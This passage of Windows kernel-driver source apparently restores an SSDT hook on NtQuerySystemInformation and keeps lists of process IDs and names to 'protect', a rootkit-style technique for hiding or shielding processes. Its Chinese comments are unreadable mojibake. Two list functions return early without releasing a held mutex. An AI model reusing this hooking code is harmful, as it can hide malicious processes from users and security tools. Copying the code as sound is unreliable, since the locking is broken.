        kIrql = KeRaiseIrqlToDpcLevel() ;
        // ��ԭ����ֵд��ȥ
        pSSDT[pde->uNtQuerySystemInformationIndex] = (ULONG)g_pNtQuerySystemInformation;
        g_pNtQuerySystemInformation = NULL ;
        KeLowerIrql(kIrql) ;
        PageProtectON() ;
        return true ;
}

/*******************************************************************************
*
*   �� �� �� : isProtectProcess
*  �������� : �ж��Ƿ�Ϊ��������
*  �����б� : ClientId             --    ����ID
*   ˵      �� : 
*  ���ؽ�� :  ����Ҫ�����Ľ��̷���true,���򷵻�false
*
*******************************************************************************/
bool isProtectProcess(IN PCLIENT_ID           ClientId )
{
        bool bResult = false ;
        NTSTATUS ntStatus = STATUS_UNSUCCESSFUL ;
        PUCHAR pProcessName = NULL ;
        PEPROCESS pEprocess = NULL ;
        bool bIsFind = false ;

        if (NULL == ClientId)
        {
                return false ;
        }
        __try
        {
                // ��ȥ�����id�ǲ���Ҫ������
                bIsFind = FindProtectProcessPID((ULONG)ClientId->UniqueProcess) ;
                // ����ҵ��ˣ���������
                if (bIsFind)
                {
                        bResult = true ;
                        __leave ;
                }

                // �ٲ�������ǲ���Ҫ������
                ntStatus = PsLookupProcessByProcessId(ClientId->UniqueProcess, &pEprocess) ;
                if (! NT_SUCCESS(ntStatus))
                {
                        pEprocess = NULL ;
                        __leave ;
                }
                pProcessName = PsGetProcessImageFileName((pEprocess)) ;
                KdPrint(((PCSTR)pProcessName)) ;
                KdPrint(("\r\n")) ;
                bIsFind = FindProtectProcessName(pProcessName) ;
                bResult = bIsFind ;                
        }

        __finally
        {
                if (NULL != pEprocess)
                {
                        ObDereferenceObject(pEprocess) ;
                        pEprocess = NULL ;
                }
        }
        return bResult ;
}

/*******************************************************************************
*
*   �� �� �� : AddProtectProcessPID
*  �������� : �����Ҫ�����Ľ���id
*  �����б� : uPID             --    ��Ҫ�����Ľ���id
*   ˵      �� : 
*  ���ؽ�� :  �ɹ�����true,ʧ�ܷ���false
*
*******************************************************************************/
bool AddProtectProcessPID(ULONG uPID)
{
        // ����Ҫ���Ƕ��߳�����
        KeWaitForSingleObject(&g_pde->MyThreadMutex,
                                                Executive,
                                                KernelMode,
                                                FALSE,
                                                NULL) ;

        if (g_uProtectProcessPIDCount + 1 >= uMaxProtectCount)
        {
                return false ;
        }
        g_ProtectProcessPID[g_uProtectProcessPIDCount] = uPID ;
        g_uProtectProcessPIDCount++ ;

        KeReleaseMutex(&g_pde->MyThreadMutex, FALSE) ;
        return true ;
}

/*******************************************************************************
*
*   �� �� �� : AddProtectProcessName
*  �������� : �����Ҫ�����Ľ�����
*  �����б� : pProcessName             --    ��Ҫ�����Ľ�����
*   ˵      �� : 
*  ���ؽ�� :  �ɹ�����true,ʧ�ܷ���false
*
*******************************************************************************/
bool AddProtectProcessName(PUCHAR pProcessName)
{
        // ����Ҫ���Ƕ��߳�����
        KeWaitForSingleObject(&g_pde->MyThreadMutex,
                                                Executive,
                                                KernelMode,
                                                FALSE,
                                                NULL) ;

        if (g_uProtectProcessCount + 1 >= uMaxProtectCount)
        {
                return false ;
        }
        if (NULL == pProcessName)
        {
                return false ;
        }

        strncpy((PCHAR)&g_ProtectProcess[g_uProtectProcessCount][0], (PCHAR)pProcessName, uMaxProtectCount - 1) ;
        g_uProtectProcessCount++ ;

        KeReleaseMutex(&g_pde->MyThreadMutex, FALSE) ;
        return true ;
}

/*******************************************************************************
*
*   �� �� �� : FindProtectProcessPID
*  �������� : ͨ��pid���ұ�������pid���ж��Ƿ�ΪҪ�����Ľ���id
*  �����б� : uPID             --    ����pid
*   ˵      �� : 
*  ���ؽ�� :  �Ƿ�Ϊ��Ҫ�����Ľ���pid���ǵĻ�����true,���򷵻�false
*
*******************************************************************************/
bool FindProtectProcessPID(ULONG uPID)
{
        // ����ȡ��
        uPID = uPID & ~3;
        for (ULONG i(0); i < g_uProtectProcessPIDCount; ++i)
        {
                if (uPID == g_ProtectProcessPID[i])
                {
                        return true ;
                }
        }
        return false ;
}

// ͨ�����������ұ������������ж��Ƿ�ΪҪ�����Ľ�����
/*******************************************************************************
*
*   �� �� �� : FindProtectProcessName
*  �������� : ͨ�����������ұ������������ж��Ƿ�ΪҪ�����Ľ�����
*  �����б� : pProcessName             --    ������
*   ˵      �� : 
*  ���ؽ�� :  �Ƿ�Ϊ��Ҫ�����Ľ��������ǵĻ�����true,���򷵻�false
*
*******************************************************************************/
bool FindProtectProcessName(PUCHAR pProcessName)
{
        if (NULL == pProcessName)
        {
                return false ;
        }

        for (ULONG i(0); i < g_uProtectProcessCount; ++i)
        {
                if(0 == strncmp((PCHAR)pProcessName, (PCHAR)g_ProtectProcess[i], MAX_PROTECT_NAME_LEN))
                {
                        return true ;
                }
        }
        return false ;
}

NTSTATUS Test(void)
{
        //KdBreakPoint() ;
        //InitializeKernelUserManage() ;

        //ULONG uUID = GetProcessUID(2336) ;

        //PUNICODE_STRING pustrUserName = GetUserNameByUID(uUID) ;
        //KdPrint(("%wZ\r\n", pustrUserName)) ;

        //ReleaseKernelUserManage() ;
        return STATUS_SUCCESS ;

}


//
// TODO: Add your module definitions here.
//



/* EOF */
